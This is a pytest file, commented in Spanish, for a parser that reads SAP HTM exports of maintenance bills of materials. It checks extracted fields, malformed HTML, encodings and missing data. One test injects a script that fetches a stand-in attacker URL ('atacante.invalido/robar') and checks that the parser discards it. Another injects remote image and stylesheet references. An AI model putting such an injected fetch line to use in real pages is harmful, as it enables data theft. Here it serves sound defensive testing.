"""Lectura del HTM exportado de SAP.

El archivo se analiza como dato. Los tests comprueban tanto lo que se
extrae como lo que **nunca** ocurre: ni se ejecuta un script, ni se sigue una
dirección, ni se depende de identificadores de fila.
"""

from datetime import date
from decimal import Decimal

import pytest

from elsa.ingestion.errors import UnrecognizedFormatError
from elsa.ingestion.model import ParsedSapSnapshot
from elsa.ingestion.sap_htm import parse_sap_snapshot

EXPORT = """<html><head><meta charset="utf-8"></head><body>
<table><tr><td>Ubicaci&oacute;n t&eacute;cnica</td><td>MB-PM1-ACC</td></tr>
<tr><td>Denominaci&oacute;n</td><td>Accionamiento ficticio</td></tr>
<tr><td>V&aacute;lido de</td><td>15.03.2026</td></tr></table>
<table id="l0006002">
<tr><th>Pos.</th><th>Material</th><th>Denominaci&oacute;n</th><th>Ctd.</th><th>U.M.</th>
    <th>Nivel</th></tr>
<tr id="l0006003"><td>0010</td><td>000000000010000001</td><td>Rodamiento ficticio</td>
    <td>2</td><td>UN</td><td>1</td></tr>
<tr id="l0009117"><td>0020</td><td>10000002</td><td>Tornillo ficticio</td><td>10</td>
    <td>UN</td><td>1</td></tr></table>
<table><tr><th>Equipo</th><th>Denominaci&oacute;n</th></tr>
<tr><td>EQ-0001</td><td>Reductor ficticio</td></tr></table>
</body></html>"""


@pytest.fixture
def snapshot() -> ParsedSapSnapshot:
    return parse_sap_snapshot(EXPORT.encode("utf-8"))


def test_functional_location_is_read(snapshot: ParsedSapSnapshot) -> None:
    assert snapshot.functional_location == "MB-PM1-ACC"


def test_description_is_read(snapshot: ParsedSapSnapshot) -> None:
    assert snapshot.description == "Accionamiento ficticio"


def test_valid_from_date_is_read(snapshot: ParsedSapSnapshot) -> None:
    assert snapshot.valid_from == date(2026, 3, 15)


def test_materials_are_read_with_quantity_and_unit(snapshot: ParsedSapSnapshot) -> None:
    material = snapshot.materials[0]

    assert material.position == "0010"
    assert material.sap_code == "000000000010000001"
    assert material.quantity == Decimal(2)
    assert material.unit == "UN"
    assert material.depth == 1


def test_child_equipments_are_kept_apart_from_materials(snapshot: ParsedSapSnapshot) -> None:
    """Mezclarlos inventaría una discrepancia en cada reconciliación."""
    assert len(snapshot.materials) == 2
    assert len(snapshot.equipments) == 1
    assert snapshot.equipments[0].sap_code == "EQ-0001"


def test_different_row_identifiers_still_parse() -> None:
    """Los `id` cambian entre exportaciones; atarse a ellos sería frágil."""
    altered = (
        EXPORT.replace("l0006003", "zz9").replace("l0009117", "qq1").replace("l0006002", "OTRO")
    )

    snapshot = parse_sap_snapshot(altered.encode("utf-8"))

    assert len(snapshot.materials) == 2
    assert [item.position for item in snapshot.materials] == ["0010", "0020"]


def test_script_content_is_discarded_and_reported() -> None:
    payload = EXPORT.replace(
        "<body>", "<body><script>fetch('http://atacante.invalido/robar')</script>"
    )

    snapshot = parse_sap_snapshot(payload.encode("utf-8"))

    codes = {warning.code for warning in snapshot.warnings}
    assert "script_content_ignored" in codes
    # Nada del script entra en los datos.
    assert all("atacante" not in (item.description or "") for item in snapshot.items)


def test_remote_references_are_reported_and_never_requested() -> None:
    payload = EXPORT.replace(
        "<body>",
        '<body><img src="http://remoto.invalido/pixel.gif">'
        '<link rel="stylesheet" href="https://remoto.invalido/x.css">',
    )

    snapshot = parse_sap_snapshot(payload.encode("utf-8"))

    warning = next(w for w in snapshot.warnings if w.code == "remote_references_ignored")
    assert "2" in (warning.location or "")


def test_malformed_html_without_closing_tags_still_parses() -> None:
    payload = b"<table><tr><th>Material<th>Ctd.<tr><td>10000001<td>3</table"

    snapshot = parse_sap_snapshot(payload)

    assert snapshot.materials[0].sap_code == "10000001"
    assert snapshot.materials[0].quantity == Decimal(3)


def test_windows_1252_without_a_declared_charset_is_decoded() -> None:
    payload = (
        "<table><tr><th>Material</th><th>Denominación</th></tr>"
        "<tr><td>10000003</td><td>Válvula ficticia</td></tr></table>"
    ).encode("cp1252")

    snapshot = parse_sap_snapshot(payload)

    assert snapshot.materials[0].description == "Válvula ficticia"


def test_a_missing_date_is_reported_not_invented() -> None:
    payload = b"<table><tr><th>Material</th><th>Ctd.</th></tr><tr><td>1</td><td>1</td></tr></table>"

    snapshot = parse_sap_snapshot(payload)

    assert snapshot.valid_from is None
    assert "missing_valid_from" in {warning.code for warning in snapshot.warnings}


def test_a_missing_functional_location_is_reported() -> None:
    payload = b"<table><tr><th>Material</th><th>Ctd.</th></tr><tr><td>1</td><td>1</td></tr></table>"

    snapshot = parse_sap_snapshot(payload)

    assert "missing_functional_location" in {w.code for w in snapshot.warnings}


def test_an_unrecognisable_export_fails_safely() -> None:
    """Se prefiere no publicar nada a publicar una lectura dudosa."""
    with pytest.raises(UnrecognizedFormatError):
        parse_sap_snapshot(b"<html><body><p>hola</p></body></html>")
